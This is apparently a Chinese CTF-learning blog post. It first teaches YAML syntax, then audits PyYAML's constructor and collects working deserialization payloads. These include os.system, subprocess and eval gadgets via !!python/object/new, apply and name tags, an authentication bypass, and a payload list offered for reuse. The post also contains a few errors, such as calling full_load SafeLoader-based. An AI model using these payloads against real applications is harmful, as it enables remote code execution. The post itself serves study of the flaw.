## 前言

前几天打HDCTF的时候，做了一道YamiYami的题目，当时利用非预期的解才出flag的，后面看了看出题人的WP，才知道这个题要考察PyYAML反序列化漏洞,之前没有见过，正好趁热打铁学习一下。

## 介绍一下什么是Yaml

YAML是一种轻量级的数据序列化语言，它的名称是"YAML Ain't Markup
Language"的递归缩写。它的设计目标是成为一种人类可读的数据交换格式。

YAML的语法非常简洁，使用缩进和特定的符号来表示数据结构。它支持多种数据类型，包括标量（字符串、数字、布尔值等）、序列（数组、列表等）和映射（键值对）。YAML还支持注释和引用，可以使文档更易于理解和维护。（其文件一般以.yml为后缀）

## Yaml基本语法

  * **大小写敏感**
    
        aaa:1
    AAA:2

这两个对于Yaml来说是不同的变量

  * **使用缩进表示层级关系缩进不允许使用tab，只允许空格**

  * **缩进的空格数不重要，只要相同层级的元素左对齐即可**

举个例子，

    
        # This is a YAML document with nested structures
    person:
      name: John
      age: 30
      address:
        street: Main St.
        city: Anytown
        state: CA
      hobbies:
        - reading
        - hiking
        - swimming
    

在这个示例中，`person`是一个映射类型，包含四个键值对。其中`address`和`hobbies`都是映射类型和序列类型的嵌套结构，使用缩进表示层级关系。`address`包含三个键值对，`hobbies`包含一个序列，其中包含三个元素。

  * **'#'表示注释**

但是只能支持单行注释

    
        #注释1
    #注释2
    

  * **一个文件中可以包含多个文件的内容，用“ --- ”即三个破折号表示一份内容的开始，用“ ... ”即三个小数点表示一份内容的结束（非必需）**

    
    
    ---    example1:
      username: admin
      passwd: 123456
    ...
    
    ---    example2:
      username: aaa
      passwd: 666
    ...
    

## Yaml数据类型与结构

  * **标量（Scalar）** ：标量是YAML中的基本数据类型，包括字符串、整数、浮点数、布尔值等。例如：
    
        name: "John"  # 字符串
    age: 30       # 整数 （可以支持二进制表示）
    height: 5.8   # 浮点数 （可以支持科学计数法）
    is_student: false  # 布尔值 (null,Null,~均为空)
    

  * **列表（List）** ：列表用短横线（-）表示，可以包含多个标量值，形成一个有序的序列。例如：
    
        fruits:
      - apple
      - banana
      - orange
    

支持 **内敛格式** （用方括号包裹，用逗号+空格分隔），例如：

    
        fruit: [apple, banana, orange]
    

支持多维数组（ **用缩进表示层级关系** ），例如：

    
        fruit: 
    -      - apple
      - banana
    -      - orange
    

  * **映射（Mapping）** ：映射用键值对表示，使用冒号（:）分隔键和值，可以包含多个键值对，形成一个无序的键值对集合。例如：
    
        person:
      name: John
      age: 30
      city: New York
    

支持 **流式风格** 的语法(用花括号包裹，用逗号+空格分割)，例如：

    
        key: { username: admin, passwd: 123456}
    

可以使用“?”声明一个复杂对象，从而可以使用多个数组来组成键，例如：

    
        ?
      - user1
      - user2
    :
      - passwd1
      - passwd2
    

允许多层嵌套( **用缩进表示层级关系** )，例如：

    
        example:
      aaa: 123
      bbb:
        ccc:
          ddd: 666
    

在这个示例中，`example`是一个映射类型，包含一个键值对`aaa`和一个键值对`bbb`。`bbb`的值是一个映射类型，包含一个键值对`ccc`，而`ccc`的值又是一个映射类型，包含一个键值对`ddd`。`ddd`的值为`666`。

  * **多行字符串（Multi-line String）** ：YAML支持在标量值中使用多行字符串，可以使用管道符（|）或折叠式大于号（>）来表示。例如：
    
        description: |
      This is a multi-line
      string using the pipe symbol. # 每行的缩进和行尾空白都会被去掉，而额外的缩进会被保留
    lines: >
      aaa
      bbbbbb
      ccccccc
    
      dddddddd  # 只有空白行才会被识别为换行，原来的换行符都会被转换成空格
    

字符串一般不用引号包裹，但是如果字符串中使用了 **反斜杠“\”开头的转义字符就必须用引号包裹** ，例如

    
        strings: 
      - Hi
      - "\u0048\u0069" # Hi的Unicode编码
      - "\x46\x69\x6e\x65" # Fine的Hex编码
    

  * **引用（Reference）** ：YAML支持使用锚点（&）和别名（*）来创建引用，可以在不同位置引用相同的值。例如：
    
        person1: &person_alias
      name: John
      age: 30
    
    person2: *person_alias
    

相当于

    
        person1:
      name: John
      age: 30
    
    person2:
      name: John
      age: 30
    

可以利用 **锚点（ &）和别名（*）**以及 **合并标签" <<"**将我们的yaml变得更加整洁，例如：

    
        # 使用锚点和别名消除重复代码
    defaults: &defaults
      host: localhost
      port: 8080
      timeout: 30
    
    development:
      <<: *defaults
      database: dev_db
    
    test:
      <<: *defaults
      database: test_db
      timeout: 60
    
    production:
      <<: *defaults
      host: prod_host
      port: 80
    

相当于

    
        development:
      host: localhost
      port: 8080
      timeout: 30
      database: dev_db
    
    test:
      host: localhost
      port: 8080
      timeout: 60
      database: test_db
    
    production:
      host: prod_host
      port: 80
      timeout: 30
    

  * **时间戳（Timestamp）** ：在YAML中，可以使用ISO 8601格式的时间戳来表示日期和时间。ISO 8601是一种国际标准，用于表示日期、时间和日期时间的格式，例如：
    
        timestamp: 2023-04-24T12:34:56.789Z
    

**类型转换**

Yaml支持使用 **严格类型标签"!!"（双感叹号+目标类型）** 来强制转换类型，例如：

    
    
    # 使用显式类型转换将字符串转换成整数和浮点数
    age: !!int 30
    pi: !!float 3.14
    
    # 使用显式类型转换将数字转换成字符串
    number_as_str: !!str 123
    
    # 使用显式类型转换将字符串转换成布尔值
    is_valid: !!bool "true"
    
    # 使用显式类型转换将时间戳转换成日期时间
    created_at: !!timestamp 2023-04-24T12:34:56.789Z
    
    # 使用显式类型转换将列表转换成其他类型
    list_as_str: !!str [1, 2, 3]
    list_as_map: !!map [1, 2, 3]
    

## PyYaml反序列化漏洞的成因与利用

### PyYaml<=5.1

在python中的PyYAML库中提供这几种方式实现python和Yaml这两种语言的转换。

**yaml- >python**

**yaml.dump**

    
    
    yaml.dump(data)

将Python对象`data`转换为YAML格式的方法。它将Python对象序列化为YAML格式的字符串，并返回这个字符串。在这个方法中，`data`是一个Python对象，可以是字典、列表、元组、整数、浮点数、字符串、布尔值等基本数据类型，也可以是自定义的类的实例。

举个例子：

    
    
    import yaml
    
    data = {
        'name': 'John',
        'age': 30,
        'is_student': True,
        'hobbies': ['reading', 'swimming', 'traveling'],
        'address': {
            'street': '123 Main St',
            'city': 'Anytown',
            'state': 'CA',
            'zip': '12345'
        }
    }
    
    yaml_data = yaml.dump(data)
    
    print(yaml_data)
    

输出结果：

    
    
    address:
      city: Anytown
      state: CA
      street: 123 Main St
      zip: '12345'
    age: 30
    hobbies:
    - reading
    - swimming
    - traveling
    is_student: true
    name: John
    

在这个代码中，我们定义了一个Python字典`data`，然后使用`yaml.dump`方法将`data`对象转换为YAML格式，并将其赋值给变量`yaml_data`。最后，我们打印`yaml_data`，输出转换后的YAML格式数据。

其实通俗点来说，就是将python的对象实例转化为yaml格式的字符串，也就是 **序列化** 。

如果我们的Python对象中包含自定义类的实例、函数等，那么使用`yaml.dump`方法进行序列化可能会导致安全问题。攻击者可以通过在YAML数据中注入恶意代码来执行任意代码，从而导致应用程序受到攻击。

**python- >yaml**

**load()**

    
    
    load(data)

`load(data)`是将YAML格式的字符串转换为Python对象的方法。它将YAML格式的字符串反序列化为Python对象，并返回这个对象。在这个方法中，`data`是一个包含YAML格式字符串的变量，可以是从文件中读取的字符串，也可以是用户输入的字符串等。

    
    
    import yaml
    
    yaml_data = """
    name: John
    age: 30
    is_student: true
    hobbies:
      - reading
      - swimming
      - traveling
    address:
      street: 123 Main St
      city: Anytown
      state: CA
      zip: '12345'
    """
    
    data = yaml.load(yaml_data)
    
    print(data)
    

输出结果：

    
    
    {'name': 'John', 'age': 30, 'is_student': True, 'hobbies': ['reading', 'swimming', 'traveling'], 'address': {'street': '123 Main St', 'city': 'Anytown', 'state': 'CA', 'zip': '12345'}}
    

这段代码是将一个包含YAML格式字符串的变量`yaml_data` **反序列化**
为Python对象，并将其赋值给变量`data`。然后，它打印出`data`，输出反序列化后的Python对象。

    
    
    load(data, Loader=yaml.Loader)

`load(data,
Loader=yaml.Loader)`是将YAML格式的字符串转换为Python对象的方法，其中`Loader`参数指定了YAML解析器的类型。

在默认情况下，`yaml.load`方法使用的解析器是`yaml.SafeLoader`，它可以安全地解析大多数YAML格式数据，但是不能解析包含Python对象的YAML数据。

这里说明一下PyYaml<=5.1版本的Loader都有哪些加载器

    
    
    Constructor:5.1版本一下默认此加载器，在 YAML 规范上新增了很多强制类型转换
    BaseConstructor：不支持强制类型转换
    SafeConstructor：支持强制类型转换和 YAML 规范保持一致

这里以默认的Constructor加载器为例，示例代码：

    
    
    import yaml
    
    class Person:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    
    # 自定义构造器函数
    def construct_person(loader, node):
        # 获取Person类的属性值
        data = loader.construct_mapping(node, deep=True)
        # 实例化Person类并设置属性
        return Person(data['name'], data['age'])
    
    # 将!python/object标签映射到自定义构造器函数
    yaml.add_constructor('!python/object:__main__.Person', construct_person)
    
    # 定义一个包含自定义类实例的YAML数据
    yaml_data = """
    name: John
    age: 30
    person:
      !python/object:__main__.Person
      name: Alice
      age: 25
    """
    
    # 使用yaml.Loader()方法解析YAML数据
    data = yaml.load(yaml_data, Loader=yaml.Loader)
    
    # 输出解析后的Python对象
    print(data)
    

输出结果：

    
    
    {'name': 'John', 'age': 30, 'person': <__main__.Person object at 0x000001BA17055390>}

这段代码定义了一个`Person`类，并使用`yaml.add_constructor`方法将`!python/object`标签映射到自定义构造器函数`construct_person`上。然后，定义了一个包含自定义类实例的YAML数据`yaml_data`，其中包含一个名为`person`的`Person`类实例。最后，使用`yaml.load`方法解析YAML数据，并将解析后的Python对象赋值给变量`data`，最终输出了`data`的值。

    
    
    load_all(data)

`load_all(data)`是一个函数调用表达式，其中`data`是一个包含多个YAML文档的字符串。`load_all`函数是`PyYAML`模块中的一个方法，用于从一个包含多个YAML文档的字符串中解析出所有的YAML文档，并返回一个生成器对象，每个元素都是一个Python对象，对应一个YAML文档。

    
    
    import yaml
    
    # 定义包含两个YAML文档的字符串
    yaml_data = """
    - name: John
      age: 30
    
    - name: Alice
      age: 25
    """
    
    # 使用yaml.load_all()方法解析所有的YAML文档
    docs = yaml.load_all(yaml_data)
    
    # 遍历生成器对象并输出解析后的Python对象
    for doc in docs:
        print(doc)
    

输出结果：

    
    
    [{'name': 'John', 'age': 30}, {'name': 'Alice', 'age': 25}]

这段代码使用`PyYAML`模块中的`yaml.load_all()`方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。

    
    
    load_all(data, Loader=yaml.Loader)

`load_all(data,
Loader=yaml.Loader)`是一个函数调用表达式，其中`data`是一个包含多个YAML文档的字符串，`yaml.Loader`是`PyYAML`模块中的一个解析器，用于解析YAML文档。

这里以默认的加载器Constructor为例，示例代码：

    
    
    import yaml
    
    # 定义包含两个YAML文档的字符串
    yaml_data = """
    - name: John
      age: 30
    
    - name: Alice
      age: 25
    """
    
    # 使用yaml.load_all()方法解析所有的YAML文档
    docs = yaml.load_all(yaml_data, Loader=yaml.Loader)
    
    # 遍历生成器对象并输出解析后的Python对象
    for doc in docs:
        print(doc)
    

输出结果：

    
    
    [{'name': 'John', 'age': 30}, {'name': 'Alice', 'age': 25}]
    

这段代码使用`PyYAML`模块中的`yaml.load_all()`方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。

以上是PyYaml<=5.1版本中常见的一些方法实现python和Yaml语言格式的转换的方法，但是往往在这种语言格式的转换的同时，也会存在一定的漏洞点的。

#### 漏洞成因

主要在PyYaml<=5.1的版本下，默认 **Constructor**
为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。

下面我们分析一下Constructor.py，找一找在解析Python标签时的源码.

我这里选用的PyYaml版本是4.2b4的

**!!python/object标签**

![](./img/8191724611315155110.png)

**!!python/object/apply标签**

![](./img/7130688412416323357.png)

**!!python/object/new**

![](./img/1807137581915864120.png)

**!!python/module**

![](./img/3216434733911534892.png)

**!!python/name**

![](./img/5363324277993650620.png)

我们通过对于这些Python标签源码的分析，可以发现，都调用了make_python_instance()这个函数方法，所以我们接着往下看make_python_instance()

    
    
    def make_python_instance(self, suffix, node,
                args=None, kwds=None, newobj=False, unsafe=False): #用于创建Python对象的实例
            if not args:
                args = [] #对args进行空值处理，如果不存在，将args设置为空列表
            if not kwds:
                kwds = {} #对kwds进行空值处理，如果不存在，将kwds设置为空字典
            cls = self.find_python_name(suffix, node.start_mark)#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象
            if not (unsafe or i/sinstance(cls, type)):
                raise ConstructorError("while constructing a Python instance", node.start_mark,
                        "expected a class, but found %r" % type(cls),
                        node.start_mark)#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。
            if newobj and isinstance(cls, type):
                return cls.__new__(cls, *args, **kwds)
            else:
                return cls(*args, **kwds)#根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例
    

审计了一下make_python_instance()函数，可以发现，这里是通过args和kwds参数动态的创建Python对象的实例，所以，我们是可以利用这个特点进行执行我们的恶意代码，从而实现攻击。

我们可以发现在make_python_instance()中又调用了find_python_name()函数，接下来继续审计find_python_name()

    
    
    def find_python_name(self, name, mark, unsafe=False):
            if not name:
                raise ConstructorError("while constructing a Python object", mark,
                        "expected non-empty name appended to the tag", mark) #如果name为空，将会报错
            if '.' in name:
                module_name, object_name = name.rsplit('.', 1) #如果name中包含"."，将会对name进行分割为模板名和对象名
            else:
                module_name = 'builtins'
                object_name = name #如果name中没有"."，则会将模板名命名为"builtins"，对象名命名为"name"
            if unsafe:
                try:
                    __import__(module_name) #unsafe默认为False，所以可以利用__import__将模块导入
                except ImportError as exc:
                    raise ConstructorError("while constructing a Python object", mark,
                            "cannot find module %r (%s)" % (module_name, exc), mark) #如果ImportError异常，将会报错
            if not module_name in sys.modules:
                raise ConstructorError("while constructing a Python object", mark,
                        "module %r is not imported" % module_name, mark)#如果模块不在sys.modules字典中，将会报错
            module = sys.modules[module_name]
            if not hasattr(module, object_name):
                raise ConstructorError("while constructing a Python object", mark,
                        "cannot find %r in the module %r"
                        % (object_name, module.__name__), mark)#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错
            return getattr(module, object_name)#利用getattr()函数获取返回值
    

通过审计find_python_name()，我们发现还可以通过引用module的类创建对象，从而执行我们的恶意代码，实现攻击。

#### 漏洞利用

通过上面漏洞成因的分析，如果我们是通过yaml.load()函数将Python进行反序列化，而且参数可控，那么我们就可以利用上述PyYaml反序列化漏洞进行攻击。

**针对!!python/object**

按照上面的分析，我们其实可以利用该标签执行我们的payload的，但是由于在!!python/object标签的使用格式中，接受参数利用花括号{}而不是利用中括号[]，所以我们无法接受args和kwds的传参，所以说无法执行我们的payload.

**针对!!python/object/new**

测试代码

    
    
    import yaml
    
    poc = '!!python/object/new:os.system ["calc.exe"]'
    #给出一些相同用法的POC
    #poc = '!!python/object/new:subprocess.check_output [["calc.exe"]]' 
    #poc = '!!python/object/new:os.popen ["calc.exe"]'
    #poc = '!!python/object/new:subprocess.run ["calc.exe"]'
    #poc = '!!python/object/new:subprocess.call ["calc.exe"]'
    #poc = '!!python/object/new:subprocess.Popen ["calc.exe"]'
    
    yaml.load(poc)
    

![](./img/6052787300512973272.png)

**针对!!python/object/apply**

测试代码

    
    
    import yaml
    
    poc = '!!python/object/apply:os.system ["calc.exe"]'
    #给出一些相同用法的POC
    #poc = '!!python/object/apply:subprocess.check_output [["calc.exe"]]' 
    #poc = '!!python/object/apply:os.popen ["calc.exe"]'
    #poc = '!!python/object/apply:subprocess.run ["calc.exe"]'
    #poc = '!!python/object/apply:subprocess.call ["calc.exe"]'
    #poc = '!!python/object/apply:subprocess.Popen ["calc.exe"]'
    
    yaml.load(poc)
    

![](./img/6420608327037561990.png)

**针对!!python/module标签**

这个标签对应的是源码中的`construct_python_module`，针对这个标签的利用方法和前两个不同，它没有调用逻辑，但是再搭配任意文件上传有奇效。

比如说，我们将我们的恶意代码写入"eval.py"，之后利用

    
    
    yaml.load('!!python/module:eval')

进行加载（这里必须指定同名模块），但是一般情况下我们的上传目录和执行目录不是同一个目录，所以我们可以通过上传一个py文件

    
    
    #a.py
    import yaml
    
    yaml.load('!!python/module:uploads.eval')
    

这个文件会上传到上传目录，可以触发`import uploads.eval`然后我们之前上传的eval.py可以成功执行

也可以直接上传`__init__.py`，之后触发的时候利用`!!python/module:uploads`就可以了

**针对!!python/name标签**

这里对应的是源码中的`construct_python_name`，和python/module标签的逻辑类似，不过!!python/name标签可以返回模块下面的属性/方法

除了上述可以结合文件上传的妙招，还可以适用于

    
    
    import yaml
    
    KEY = 'Evi1s7'
    
    def check(miyao):
        try:
            key = yaml.load(miyao).get("key",None)
        except Exception:
            key = None
        if key == KEY:
            print("你好Evi1s7")
        else:
            print("陌生人爬")
    
    
    miyao = ''
    check(miyao)
    

这里如果我们的payload:

    
    
    ?key=!!python/name:__main__.KEY

我们可以直接绕过key的认证，直接获取权限，但是我们要知道变量名。

### PyYaml>5.1

在Python的PyYaml库中提供以下方法将python和yaml进行语言格式转换：

**load()**

在PyYaml>5.1的版本之后，如果要使用load()函数，要跟上一个Loader的参数，否则会报错。(不影响正常输出)

    
    
    load(data)

实例代码：

    
    
    import yaml
    
    # 从字符串中加载 YAML 数据
    yaml_data = """
    - name: Alice
      age: 25
    - name: Bob
      age: 30
    """
    data = yaml.load(yaml_data)
    print(data)
    
    # 从文件中加载 YAML 数据
    with open('data.yaml') as f:
        data = yaml.load(f)
        print(data)
    

输出结果：

    
    
    [{'name': 'Alice', 'age': 25}, {'name': 'Bob', 'age': 30}]

这里其实和PyYaml<=5.1版本一样，就不多赘述。

    
    
    load(data, Loader=yaml.Loader)

这里说明一下PyYaml>5.1都有哪些加载器

    
    
    BaseLoader：不支持强制类型转换
    SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。
    FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。
    UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。

以SafeLoader为例，示例代码：

    
    
    import yaml
    
    class Person:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    
    def person_constructor(loader, node):
        fields = loader.construct_mapping(node, deep=True)
        return Person(**fields)
    
    yaml_data = """
    - !!python/object:__main__.Person
      name: Alice
      age: 25
    - !!python/object:__main__.Person
      name: Bob
      age: 30
    """
    
    yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor)
    
    data = yaml.load(yaml_data, Loader=yaml.SafeLoader)
    
    for person in data:
        print(person.name, person.age)
    

输出结果：

    
    
    Alice 25
    Bob 30
    
    
    load_all(data)

示例代码：

    
    
    import yaml
    
    yaml_data = """
    # 第一个文档
    - name: Alice
      age: 25
    
    # 第二个文档
    - name: Bob
      age: 30
    """
    
    data = yaml.load_all(yaml_data)
    
    for doc in data:
        for person in doc:
            print(person['name'], person['age'])
    

输出结果：

    
    
    Alice 25
    Bob 30

这里和PyYaml<=5.1版本一样，就不多赘述了。

    
    
    load_all(data, Loader=yaml.Loader)

以SafeLoader加载器为例，示例代码：

    
    
    import yaml
    
    class Person:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    
    def person_constructor(loader, node):
        fields = loader.construct_mapping(node, deep=True)
        return Person(**fields)
    
    yaml_data = """
    # 第一个文档
    - !!python/object:__main__.Person
      name: Alice
      age: 25
    
    # 第二个文档
    - !!python/object:__main__.Person
      name: Bob
      age: 30
    """
    
    yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor)
    
    data = yaml.load_all(yaml_data, Loader=yaml.SafeLoader)
    
    for doc in data:
        for person in doc:
            print(person.name, person.age)
    

输出结果：

    
    
    Alice 25
    Bob 30

这里其实和load(data, Loader=yaml.Loader)函数一样，就不多赘述了。

    
    
    full_load(data)

load()与full_load()函数的区别是，full_load()使用 **SafeLoader** 作为默认解析器。

所以说，这是一个相对安全的解析器，它限制了可以执行的Python代码的类型。

示例代码：

    
    
    import yaml
    
    yaml_data = """
    - foo
    - bar
    - baz
    """
    
    data = yaml.full_load(yaml_data)
    
    print(data)
    

输出结果：

    
    
    ['foo', 'bar', 'baz']
    
    
    full_load_all(data)

full_load_all()与full_load()函数类似，但可以处理包含多个YAML文档的数据流。

示例代码：

    
    
    import yaml
    
    yaml_data = """
    - foo
    - bar
    - baz
    ---    - alice
    - bob
    - charlie
    """
    
    data = yaml.full_load_all(yaml_data)
    
    for doc in data:
        print(doc)
    

输出结果：

    
    
    ['foo', 'bar', 'baz']
    ['alice', 'bob', 'charlie']
    
    
    unsafe_load(data)

unsafe_load()函数可以加载包含自定义Python对象的YAML数据，允许加载和执行任意Python代码，并尝试将它们反序列化为实际的Python对象。

（存在安全隐患）

示例代码：

    
    
    import yaml
    
    yaml_data = """
    !!python/object:__main__.Person
    name: Alice
    age: 25
    """
    
    class Person:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    
    data = yaml.unsafe_load(yaml_data)
    
    print(data)
    

输出结果：

    
    
    <__main__.Person object at 0x0000022DA0D36CD0>
    
    
    unsafe_load_all(data)

相比unsafe_load()，unsafe_load_all()用于将多个YAML文档加载为Python对象的生成器。

示例代码：

    
    
    import yaml
    
    yaml_data = """
    - foo
    - bar
    - baz
    ---    - !!python/object:__main__.Person
      name: Alice
      age: 25
    """
    
    class Person:
        def __init__(self, name, age):
            self.name = name
            self.age = age
    
    data = yaml.unsafe_load_all(yaml_data)
    
    for doc in data:
        print(doc)
    

输出结果：

    
    
    ['foo', 'bar', 'baz']
    [<__main__.Person object at 0x00000174FFEBD210>]

#### 漏洞成因

这里的漏洞成因和PyYaml<=5.1一样，都是constructor.py中的一些不严谨的代码引起的漏洞。

#### 漏洞利用

我这里选用测试的PyYaml版本是5.1.1版本。

在PyYaml>5.1的版本之后，Fullloader这个加载器对于payload的限制比较多了，我们延用PyYaml的poc还是可以的，只不过要修改一下。

我们还可以利用python内置的builtins模块(因为之前我们审计constructor.py时，发现定义的find_python_name()中，如果不用"."将模块名和对象名分开，会默认调用builtins模块)

##### 1.沿用PyYaml<=5.1的poc

    
    
    from yaml import *
    poc= b"""!!python/object/apply:os.system
    - calc"""
    #subprocess.check_output
    #os.popen
    #subprocess.run
    #subprocess.call
    #subprocess.Popen
    
    yaml.load(poc,Loader=Loader)
    

##### 2.利用builtins模块中的内置函数

首先，我们先明确builtins中的所有的类，从而筛选出可以利用的类

    
    
    import builtins
    
    builtin_classes = []
    for obj_name in dir(builtins):
        obj = getattr(builtins, obj_name)
        if isinstance(obj, type):
            builtin_classes.append(obj)
    
    print(builtin_classes)
    

输出结果：

    
    
    [<class 'ArithmeticError'>, <class 'AssertionError'>, <class 'AttributeError'>, <class 'BaseException'>, <class 'BaseExceptionGroup'>, <class 'BlockingIOError'>, <class 'BrokenPipeError'>, <class 'BufferError'>, <class 'BytesWarning'>, <class 'ChildProcessError'>, <class 'ConnectionAbortedError'>, <class 'ConnectionError'>, <class 'ConnectionRefusedError'>, <class 'ConnectionResetError'>, <class 'DeprecationWarning'>, <class 'EOFError'>, <class 'EncodingWarning'>, <class 'OSError'>, <class 'Exception'>, <class 'ExceptionGroup'>, <class 'FileExistsError'>, <class 'FileNotFoundError'>, <class 'FloatingPointError'>, <class 'FutureWarning'>, <class 'GeneratorExit'>, <class 'OSError'>, <class 'ImportError'>, <class 'ImportWarning'>, <class 'IndentationError'>, <class 'IndexError'>, <class 'InterruptedError'>, <class 'IsADirectoryError'>, <class 'KeyError'>, <class 'KeyboardInterrupt'>, <class 'LookupError'>, <class 'MemoryError'>, <class 'ModuleNotFoundError'>, <class 'NameError'>, <class 'NotADirectoryError'>, <class 'NotImplementedError'>, <class 'OSError'>, <class 'OverflowError'>, <class 'PendingDeprecationWarning'>, <class 'PermissionError'>, <class 'ProcessLookupError'>, <class 'RecursionError'>, <class 'ReferenceError'>, <class 'ResourceWarning'>, <class 'RuntimeError'>, <class 'RuntimeWarning'>, <class 'StopAsyncIteration'>, <class 'StopIteration'>, <class 'SyntaxError'>, <class 'SyntaxWarning'>, <class 'SystemError'>, <class 'SystemExit'>, <class 'TabError'>, <class 'TimeoutError'>, <class 'TypeError'>, <class 'UnboundLocalError'>, <class 'UnicodeDecodeError'>, <class 'UnicodeEncodeError'>, <class 'UnicodeError'>, <class 'UnicodeTranslateError'>, <class 'UnicodeWarning'>, <class 'UserWarning'>, <class 'ValueError'>, <class 'Warning'>, <class 'OSError'>, <class 'ZeroDivisionError'>, <class '_frozen_importlib.BuiltinImporter'>, <class 'bool'>, <class 'bytearray'>, <class 'bytes'>, <class 'classmethod'>, <class 'complex'>, <class 'dict'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frozenset'>, <class 'int'>, <class 'list'>, <class 'map'>, <class 'memoryview'>, <class 'object'>, <class 'property'>, <class 'range'>, <class 'reversed'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'str'>, <class 'super'>, <class 'tuple'>, <class 'type'>, <class 'zip'>]

现在就是找可以利用的类了，继续回到我们的constructor.py中，

进一步审计 construct_python_object_apply()时，我发现了一个漏洞点

![](./img/9096885531611060609.png)

果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有"{'extend':function}"，这样的话，我们就可以利用extend进行任意函数的执行了。

但是，经过测试，我发现上面builtins中的这些类中，只有frozenset,bytes,tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。

我们接着看make_python_instance()，

![](./img/9152848336732159108.png)

这里只要我们的内置类可以执行`cls.__new__(cls, *args,
**kwds)`这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。

所以猜测frozenset,bytes,tuple应该是可以执行上述代码，所以可以进行命令执行的

测试payload：

    
    
    !!python/object/new:bytes  
            - !!python/object/new:map  
              - !!python/name:eval  
              - ["__import__\x28'pickle'\x29.load\x28open\x28'fileinfo/pik','rb'\x29\x29"]
    
    
    !!python/object/new:frozenset  
    - !!python/object/new:map  
      - !!python/name:os.popen  
      - ["bash /app/fileinfo/cmd"]
    
    
    !!python/object/new:tuple  
            - !!python/object/new:map  
              - !!python/name:eval  
              - ["print(123)"]

发现都是有回显的

这里顺便附上一些我找到的payload，供大家使用:

    
    
    #报错但是执行了
    - !!python/object/new:str
        args: []
        state: !!python/tuple
        - "__import__('os').system('whoami')"
        - !!python/object/new:staticmethod
          args: [0]
          state:
            update: !!python/name:exec
    
    
    - !!python/object/new:yaml.MappingNode
      listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]'
      state:
        tag: !!str dummy
        value: !!str dummy
        extend: !!python/name:yaml.unsafe_load
    
    
    #创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
    !!python/object/new:type
      args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
      listitems: "__import__('os').system('whoami')"

PS:

当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python/object/apply标签的payload了，别的都可以利用

上述payload当我测试到5.4b1版本时，发现只有利用`针对!!python/name标签`的payload可以命令执行，别的payload都不能用了

看了看Tr0y佬的文章，认识到了一些高版本的绕过方式，由于不是很常见，我这里就不多介绍了

当版本大于等于5.3.1:[Prevents arbitrary code execution during python/object/new
constructor by ret2libc · Pull Request #386 · yaml/pyyaml ·
GitHub](https://github.com/yaml/pyyaml/pull/386)

当版本大于等于6.0:[Prevents arbitrary code execution during python/object/new
constructor by ret2libc · Pull Request #386 · yaml/pyyaml ·
GitHub](https://github.com/yaml/pyyaml/pull/386)

### 利用ruamel.yaml读写yaml文件

在网上搜资料的时候，发现了也可以利用ruamel.yaml读写yaml文件，所以我在想，是不是也存在PyYaml反序列化漏洞，进行测试一下。

我这里还是沿用PyYaml>5.1的poc

    
    
    import ruamel.yaml
    
    poc= b"""!!python/object/apply:os.system
    - calc"""
    
    ruamel.yaml.load(poc)
    

![](./img/1619476885798787552.png)

虽然回显报错，但是仍然可以执行，所以利用ruamel.yaml读写yaml文件也是存在上述的漏洞的，这里就不再测试。

# 参考

[YAML - 维基百科，自由的百科全书 (wikipedia.org)](https://zh.wikipedia.org/wiki/YAML)

[yaml-deserialization.pdf
(packetstormsecurity.net)](https://dl.packetstormsecurity.net/papers/general/yaml-deserialization.pdf)

[(93条消息) Python笔记-ruamel.yaml读写yaml文件_蜀山客e的博客-CSDN博客](https://blog.csdn.net/Asaasa1/article/details/109510643)

[SecMap - 反序列化（PyYAML） - Tr0y's Blog](https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/)

